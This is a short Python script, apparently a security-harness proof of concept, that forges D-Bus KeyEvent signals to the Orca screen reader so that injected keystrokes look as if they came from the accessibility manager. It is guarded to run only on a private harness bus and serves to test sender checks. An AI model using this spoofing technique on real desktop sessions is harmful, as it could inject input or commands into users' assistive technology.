#!/usr/bin/python3
"""key_forger.py - a rogue session-bus client that forges Mutter's KeyEvent signal.

Usage: key_forger.py SESSION_ADDRESS [COUNT]

Looks up the unique name that owns org.gnome.Orca.KeyboardMonitor (the screen reader) and sends
it COUNT unicast `org.freedesktop.a11y.KeyboardMonitor.KeyEvent` signals for the plain key `a`
from OUR connection (path /org/freedesktop/a11y/Manager), exactly like the real manager would.
A screen reader that does not check the sender would echo "a" or run commands. Prints the
number of signals sent. Refuses to run outside a private harness session bus.
"""
import sys

import dbus
import dbus.bus
import dbus.lowlevel

ORCA = "org.gnome.Orca.KeyboardMonitor"
PATH = "/org/freedesktop/a11y/Manager"
IFACE = "org.freedesktop.a11y.KeyboardMonitor"


def main():
    addr = sys.argv[1]
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 5
    if "gorca-h." not in addr:
        sys.exit("refusing to run: the session bus is not a private harness bus")
    conn = dbus.bus.BusConnection(addr)
    owner = conn.get_name_owner(ORCA)
    for i in range(count):
        for released in (False, True):
            msg = dbus.lowlevel.SignalMessage(PATH, IFACE, "KeyEvent")
            msg.set_destination(owner)
            msg.append(
                dbus.Boolean(released),
                dbus.UInt32(0),
                dbus.UInt32(0x61),
                dbus.UInt32(0x61),
                dbus.UInt16(38),
                signature="buuuq",
            )
            conn.send_message(msg)
    conn.flush()
    print(count)


main()
